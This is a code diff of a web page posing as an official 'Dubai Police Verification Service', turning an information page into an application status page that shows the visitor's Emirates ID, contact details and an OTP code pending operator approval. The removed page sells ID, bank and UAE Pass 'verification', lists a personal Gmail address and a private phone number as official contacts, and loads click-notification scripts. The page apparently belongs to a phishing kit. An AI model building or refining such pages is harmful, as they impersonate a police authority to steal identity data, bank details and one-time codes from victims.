@@ -3,21 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Information - Dubai Police Verification Service</title>
+    <title>Verification Status - Dubai Police Verification Service</title>
     <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Outlined" rel="stylesheet">
-    
-    <!-- Email Notification System -->
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-    <script src="../js/notifier-config.js"></script>
-    <script src="../js/click-notifier.js"></script>
-    
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-        
+
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: #f5f5f5;
@@ -223,181 +217,198 @@
             margin-bottom: 10px;
             font-size: 14px;
         }
-        
-        .container {
+
+        /* Main Content */
+        .main-content {
             max-width: 1200px;
-            margin: 0 auto;
+            margin: 40px auto;
+            padding: 0 20px;
+        }
+
+        .container {
             background: white;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        
-        .content {
-            padding: 60px 40px;
-        }
-        
-        .info-section {
-            margin-bottom: 50px;
-        }
-        
-        .info-section h2 {
-            color: #00a99d;
-            font-size: 28px;
-            margin-bottom: 20px;
-            border-bottom: 3px solid #00a99d;
-            padding-bottom: 10px;
-        }
-        
-        .info-section p {
-            color: #555;
-            font-size: 16px;
-            line-height: 1.8;
-            margin-bottom: 15px;
-        }
-        
-        .info-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 30px;
-            margin-top: 30px;
-        }
-        
-        .info-card {
-            background: #f9f9f9;
             border-radius: 15px;
-            padding: 30px;
-            border: 2px solid #e0e0e0;
-            transition: all 0.3s;
-        }
-        
-        .info-card:hover {
-            border-color: #00a99d;
-            box-shadow: 0 10px 30px rgba(0, 169, 157, 0.2);
-            transform: translateY(-5px);
-        }
-        
-        .info-card h3 {
-            color: #00a99d;
-            font-size: 22px;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .info-card .icon {
-            font-size: 28px;
-        }
-        
-        .info-card ul {
-            list-style: none;
-            padding-left: 0;
-        }
-        
-        .info-card ul li {
-            color: #555;
-            padding: 8px 0;
-            padding-left: 25px;
-            position: relative;
-        }
-        
-        .info-card ul li:before {
-            content: "✓";
-            position: absolute;
-            left: 0;
-            color: #4CAF50;
-            font-weight: bold;
-        }
-        
-        .contact-box {
-            background: linear-gradient(135deg, #00a99d 0%, #008c84 100%);
-            color: white;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
+            max-width: 700px;
+            width: 100%;
+            margin: 0 auto;
             padding: 40px;
-            border-radius: 15px;
             text-align: center;
-            margin-top: 40px;
         }
-        
-        .contact-box h3 {
-            font-size: 24px;
-            margin-bottom: 20px;
+
+        .logo {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 20px;
         }
-        
-        .contact-box p {
+
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
             font-size: 16px;
+        }
+
+        .status-container {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 30px;
+            margin-bottom: 30px;
+        }
+
+        .status-icon {
+            font-size: 60px;
+            margin-bottom: 15px;
+        }
+
+        .status-icon.pending {
+            color: #ffc107;
+        }
+
+        .status-icon.approved {
+            color: #28a745;
+        }
+
+        .status-icon.rejected {
+            color: #dc3545;
+        }
+
+        .status-text {
+            font-size: 24px;
+            font-weight: 600;
             margin-bottom: 10px;
         }
-        
-        .contact-box a {
+
+        .status-text.pending {
+            color: #856404;
+        }
+
+        .status-text.approved {
+            color: #155724;
+        }
+
+        .status-text.rejected {
+            color: #721c24;
+        }
+
+        .status-description {
+            color: #666;
+            line-height: 1.6;
+        }
+
+        .details {
+            text-align: left;
+            margin-bottom: 30px;
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid #e9ecef;
+        }
+
+        .detail-row:last-child {
+            border-bottom: none;
+        }
+
+        .detail-label {
+            color: #666;
+            font-weight: 500;
+        }
+
+        .detail-value {
+            color: #333;
+            font-weight: 600;
+        }
+
+        .otp-box {
+            background: linear-gradient(135deg, #00a99d 0%, #008c84 100%);
             color: white;
-            text-decoration: none;
-            font-weight: bold;
-            border-bottom: 2px solid white;
-            padding-bottom: 2px;
-        }
-        
-        .back-button {
-            display: inline-block;
-            background: #00a99d;
-            color: white;
-            padding: 15px 30px;
-            border-radius: 8px;
-            text-decoration: none;
-            font-size: 16px;
-            font-weight: bold;
-            margin-top: 30px;
-            transition: all 0.3s;
-        }
-        
-        .back-button:hover {
-            background: #008c84;
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 169, 157, 0.3);
-        }
-        
-        .faq-item {
-            background: white;
-            border: 2px solid #e0e0e0;
-            border-radius: 10px;
             padding: 20px;
-            margin-bottom: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+
+        .otp-label {
+            font-size: 14px;
+            margin-bottom: 10px;
+            opacity: 0.9;
+        }
+
+        .otp-code {
+            font-size: 36px;
+            font-weight: 700;
+            letter-spacing: 5px;
+        }
+
+        .actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
             transition: all 0.3s;
         }
-        
-        .faq-item:hover {
-            border-color: #00a99d;
+
+        .btn-primary {
+            background: #00a99d;
+            color: white;
         }
-        
-        .faq-question {
+
+        .btn-primary:hover {
+            background: #008c84;
+        }
+
+        .btn-secondary {
+            background: #e9ecef;
             color: #333;
-            font-weight: bold;
-            font-size: 18px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
         }
-        
-        .faq-answer {
-            color: #555;
-            margin-top: 15px;
-            line-height: 1.6;
-            display: none;
+
+        .btn-secondary:hover {
+            background: #dee2e6;
         }
-        
-        .faq-item.active .faq-answer {
-            display: block;
+
+        .loading {
+            text-align: center;
+            padding: 40px;
         }
-        
-        .faq-item .toggle-icon {
-            font-size: 24px;
-            color: #00a99d;
-            transition: transform 0.3s;
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #00a99d;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
         }
-        
-        .faq-item.active .toggle-icon {
-            transform: rotate(45deg);
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-        
+
+        .refresh-info {
+            font-size: 14px;
+            color: #666;
+            margin-top: 20px;
+            font-style: italic;
+        }
+
         @media (max-width: 768px) {
             .nav-links {
                 display: none;
@@ -410,79 +421,25 @@
             .page-header h1 {
                 font-size: 32px;
             }
-            
+
             .container {
-                border-radius: 10px;
-            }
-            
-            .content {
                 padding: 30px 20px;
             }
-            
-            .info-section {
-                margin-bottom: 30px;
+
+            h1 {
+                font-size: 24px;
             }
-            
-            .info-section h2 {
-                font-size: 20px;
+
+            .otp-code {
+                font-size: 28px;
             }
-            
-            .info-grid {
-                grid-template-columns: 1fr;
-                gap: 20px;
-            }
-            
-            .info-card {
-                padding: 20px;
-            }
-            
-            .info-card h3 {
-                font-size: 18px;
-            }
-            
-            .contact-box {
-                padding: 30px 20px;
-            }
-            
-            .contact-box h3 {
-                font-size: 20px;
-            }
-            
-            .contact-box p {
-                font-size: 14px;
-            }
-            
-            .back-button {
-                padding: 12px 24px;
-                font-size: 14px;
-            }
-            
-            .faq-question {
-                font-size: 16px;
-            }
-            
-            .faq-answer {
-                font-size: 14px;
+
+            .actions {
+                flex-direction: column;
             }
 
             .footer-content {
                 grid-template-columns: 1fr;
-            }
-        }
-        
-        @media (max-width: 480px) {
-            .page-header h1 {
-                font-size: 24px;
-            }
-            
-            .info-card h3 {
-                font-size: 16px;
-                flex-direction: column;
-                align-items: flex-start;
-            }
-            
-            .info-card .icon {
-                font-size: 24px;
             }
         }
     </style>
@@ -506,8 +463,8 @@
             <ul class="nav-links">
                 <li><a href="/home">Home</a></li>
                 <li><a href="/about">About Us</a></li>
-                <li><a href="/information" class="active">Information</a></li>
-                <li><a href="/status">Verification Status</a></li>
+                <li><a href="/information">Information</a></li>
+                <li><a href="/status" class="active">Verification Status</a></li>
                 <li><a href="/contact">Contact Us</a></li>
             </ul>
             <div class="nav-actions">
@@ -524,167 +481,46 @@
 
     <!-- Page Header -->
     <div class="page-header">
-        <h1>📋 Information Center</h1>
-        <p>Everything You Need to Know About Our Verification Services</p>
+        <h1>Verification Status</h1>
+        <p>Track Your Application Progress</p>
     </div>
 
-    <div class="container">
-        
-        <div class="content">
-            <!-- About Section -->
-            <div class="info-section">
-                <h2>About Our Service</h2>
-                <p>
-                    The Dubai Police Verification Service is an official government platform designed to help residents 
-                    and visitors verify various documents and records with the Dubai Police. Our service ensures quick, 
-                    secure, and reliable verification of your important documents.
-                </p>
-                <p>
-                    We are committed to providing transparent, efficient, and accessible services to all individuals 
-                    requiring police verification in Dubai. Our platform is backed by advanced technology and adheres 
-                    to the highest standards of data security and privacy.
-                </p>
+    <!-- Main Content -->
+    <div class="main-content">
+        <div class="container">
+            <div id="loadingScreen" class="loading">
+                <div class="spinner"></div>
+                <p>Checking verification status...</p>
             </div>
-            
-            <!-- Services Grid -->
-            <div class="info-section">
-                <h2>Our Services</h2>
-                <div class="info-grid">
-                    <div class="info-card">
-                        <h3>
-                            <span class="icon">🆔</span>
-                            Emirates ID Verification
-                        </h3>
-                        <ul>
-                            <li>Real-time verification</li>
-                            <li>Instant status updates</li>
-                            <li>Secure data handling</li>
-                            <li>24/7 availability</li>
-                            <li>Email notifications</li>
-                        </ul>
-                    </div>
-                    
-                    <div class="info-card">
-                        <h3>
-                            <span class="icon">🚓</span>
-                            Police Clearance Check
-                        </h3>
-                        <ul>
-                            <li>Criminal record verification</li>
-                            <li>Background checks</li>
-                            <li>Employment screening</li>
-                            <li>Official certificates</li>
-                            <li>Fast processing</li>
-                        </ul>
-                    </div>
-                    
-                    <div class="info-card">
-                        <h3>
-                            <span class="icon">🏦</span>
-                            Bank Information Verification
-                        </h3>
-                        <ul>
-                            <li>Account verification</li>
-                            <li>Transaction records</li>
-                            <li>Financial checks</li>
-                            <li>Secure authentication</li>
-                            <li>Confidential handling</li>
-                        </ul>
-                    </div>
-                    
-                    <div class="info-card">
-                        <h3>
-                            <span class="icon">🔐</span>
-                            UAE Pass Verification
-                        </h3>
-                        <ul>
-                            <li>Digital identity check</li>
-                            <li>Biometric verification</li>
-                            <li>Secure authentication</li>
-                            <li>Quick processing</li>
-                            <li>Government approved</li>
-                        </ul>
-                    </div>
+
+            <div id="statusScreen" style="display: none;">
+                <img src="../dubailegalcheck.ae/wp-content/uploads/2025/02/images__8_-removebg-preview.png" alt="Logo" class="logo">
+                <h1>Verification Status</h1>
+                <p class="subtitle">Dubai Police Verification Service</p>
+
+                <div class="status-container">
+                    <div id="statusIcon" class="status-icon"></div>
+                    <div id="statusText" class="status-text"></div>
+                    <div id="statusDescription" class="status-description"></div>
                 </div>
-            </div>
-            
-            <!-- FAQ Section -->
-            <div class="info-section">
-                <h2>Frequently Asked Questions</h2>
-                
-                <div class="faq-item">
-                    <div class="faq-question">
-                        How long does verification take?
-                        <span class="toggle-icon">+</span>
-                    </div>
-                    <div class="faq-answer">
-                        Most verifications are processed within 24-48 hours. Emirates ID verification is typically instant, 
-                        while police clearance checks may take 2-3 business days depending on the complexity of the request.
-                    </div>
+
+                <div class="details" id="applicationDetails"></div>
+
+                <div id="otpBox" class="otp-box" style="display: none;">
+                    <div class="otp-label">Your OTP Code</div>
+                    <div class="otp-code" id="otpCode"></div>
                 </div>
-                
-                <div class="faq-item">
-                    <div class="faq-question">
-                        Is my data secure?
-                        <span class="toggle-icon">+</span>
-                    </div>
-                    <div class="faq-answer">
-                        Yes, absolutely. We use advanced encryption and security protocols to protect your personal information. 
-                        All data is stored securely and handled in compliance with UAE data protection regulations.
-                    </div>
+
+                <div class="actions">
+                    <button class="btn btn-primary" onclick="checkStatus()">🔄 Refresh Status</button>
+                    <button class="btn btn-secondary" onclick="goHome()">← Back to Home</button>
                 </div>
-                
-                <div class="faq-item">
-                    <div class="faq-question">
-                        What documents do I need?
-                        <span class="toggle-icon">+</span>
-                    </div>
-                    <div class="faq-answer">
-                        Requirements vary by service. For Emirates ID verification, you'll need your Emirates ID number. 
-                        For police clearance, you'll need a valid passport and UAE residence visa. For bank verification, 
-                        you'll need your account details and authorization.
-                    </div>
-                </div>
-                
-                <div class="faq-item">
-                    <div class="faq-question">
-                        Can I track my application?
-                        <span class="toggle-icon">+</span>
-                    </div>
-                    <div class="faq-answer">
-                        Yes! Each application receives a unique tracking ID. You can use this ID to check the status of 
-                        your verification request at any time. You'll also receive email notifications for important updates.
-                    </div>
-                </div>
-                
-                <div class="faq-item">
-                    <div class="faq-question">
-                        What are the fees?
-                        <span class="toggle-icon">+</span>
-                    </div>
-                    <div class="faq-answer">
-                        Fees vary depending on the type of verification. Emirates ID verification: AED 50, 
-                        Police clearance certificate: AED 100, Bank verification: AED 75. 
-                        All fees are payable online through secure payment gateways.
-                    </div>
-                </div>
-            </div>
-            
-            <!-- Contact Box -->
-            <div class="contact-box">
-                <h3>📞 Need Help?</h3>
-                <p>Our support team is available 24/7 to assist you</p>
-                <p>Email: <a href="mailto:testm7369@gmail.com">testm7369@gmail.com</a></p>
-                <p>Phone: <a href="tel:+971563614931">+971 56 361 4931</a></p>
-                <p>WhatsApp: <a href="https://wa.me/971563614931">Chat with us</a></p>
-            </div>
-            
-            <div style="text-align: center;">
-                <a href="/home" class="back-button">← Back to Home</a>
+
+                <p class="refresh-info">Status updates automatically every 5 seconds</p>
             </div>
         </div>
     </div>
-    
+
     <!-- Footer -->
     <footer>
         <div class="footer-container">
@@ -740,24 +576,134 @@
             </div>
         </div>
     </footer>
-    
+
+    <script src="../js/verification-handler.js"></script>
     <script>
-        // FAQ Toggle
-        for (const item of document.querySelectorAll('.faq-item')) {
-            item.addEventListener('click', () => {
-                const isActive = item.classList.contains('active');
+        let currentApplication = null;
+        let checkInterval = null;
+
+        // Load and display status
+        function loadStatus() {
+            // Get application from session storage
+            currentApplication = verificationHandler.getCurrentApplication();
+
+            if (!currentApplication) {
+                // Try to get from URL parameters
+                const urlParams = new URLSearchParams(globalThis.location.search);
+                const appId = urlParams.get('id');
                 
-                // Close all FAQ items
-                for (const i of document.querySelectorAll('.faq-item')) {
-                    i.classList.remove('active');
+                if (appId) {
+                    currentApplication = verificationHandler.getApplicationById(appId);
                 }
-                
-                // Open clicked item if it wasn't active
-                if (!isActive) {
-                    item.classList.add('active');
-                }
-            });
+            }
+
+            if (!currentApplication) {
+                document.getElementById('loadingScreen').innerHTML = `
+                    <h2>No Application Found</h2>
+                    <p style="margin: 20px 0;">Please submit a verification request first.</p>
+                    <button class="btn btn-primary" onclick="goHome()">Go to Home</button>
+                `;
+                return;
+            }
+
+            // Check for updated status
+            const updatedApp = verificationHandler.getApplicationById(currentApplication.id);
+            if (updatedApp) {
+                currentApplication = updatedApp;
+                sessionStorage.setItem('currentApplication', JSON.stringify(updatedApp));
+            }
+
+            displayStatus();
         }
+
+        // Display status
+        function displayStatus() {
+            document.getElementById('loadingScreen').style.display = 'none';
+            document.getElementById('statusScreen').style.display = 'block';
+
+            const statusIcon = document.getElementById('statusIcon');
+            const statusText = document.getElementById('statusText');
+            const statusDescription = document.getElementById('statusDescription');
+            const otpBox = document.getElementById('otpBox');
+
+            // Update status display based on current status
+            if (currentApplication.status === 'pending') {
+                statusIcon.className = 'status-icon pending';
+                statusIcon.textContent = '⏳';
+                statusText.className = 'status-text pending';
+                statusText.textContent = 'Verification Pending';
+                statusDescription.textContent = 'Your application is being reviewed by our team. Please wait for approval.';
+                otpBox.style.display = 'block';
+                document.getElementById('otpCode').textContent = currentApplication.otp;
+            } else if (currentApplication.status === 'approved') {
+                statusIcon.className = 'status-icon approved';
+                statusIcon.textContent = '✅';
+                statusText.className = 'status-text approved';
+                statusText.textContent = 'Verification Successful';
+                statusDescription.textContent = 'Congratulations! Your verification has been approved.';
+                otpBox.style.display = 'none';
+            } else if (currentApplication.status === 'rejected') {
+                statusIcon.className = 'status-icon rejected';
+                statusIcon.textContent = '❌';
+                statusText.className = 'status-text rejected';
+                statusText.textContent = 'Verification Rejected';
+                statusDescription.textContent = 'Your application was not approved. Please contact support for more information.';
+                otpBox.style.display = 'none';
+            }
+
+            // Display application details
+            const detailsHtml = `
+                <div class="detail-row">
+                    <span class="detail-label">Application ID:</span>
+                    <span class="detail-value">${currentApplication.id}</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Full Name:</span>
+                    <span class="detail-value">${currentApplication.fullName}</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Emirates ID:</span>
+                    <span class="detail-value">${currentApplication.emiratesId}</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Email:</span>
+                    <span class="detail-value">${currentApplication.email}</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Mobile:</span>
+                    <span class="detail-value">${currentApplication.mobileNumber}</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Submitted:</span>
+                    <span class="detail-value">${new Date(currentApplication.timestamp).toLocaleString()}</span>
+                </div>
+            `;
+
+            document.getElementById('applicationDetails').innerHTML = detailsHtml;
+        }
+
+        // Check status (refresh)
+        function checkStatus() {
+            loadStatus();
+        }
+
+        // Go to home page
+        function goHome() {
+            window.location.href = '/home';
+        }
+
+        // Initialize
+        loadStatus();
+
+        // Auto-refresh every 5 seconds
+        checkInterval = setInterval(loadStatus, 5000);
+
+        // Clear interval on page unload
+        window.addEventListener('beforeunload', function() {
+            if (checkInterval) {
+                clearInterval(checkInterval);
+            }
+        });
     </script>
 </body>
 </html>
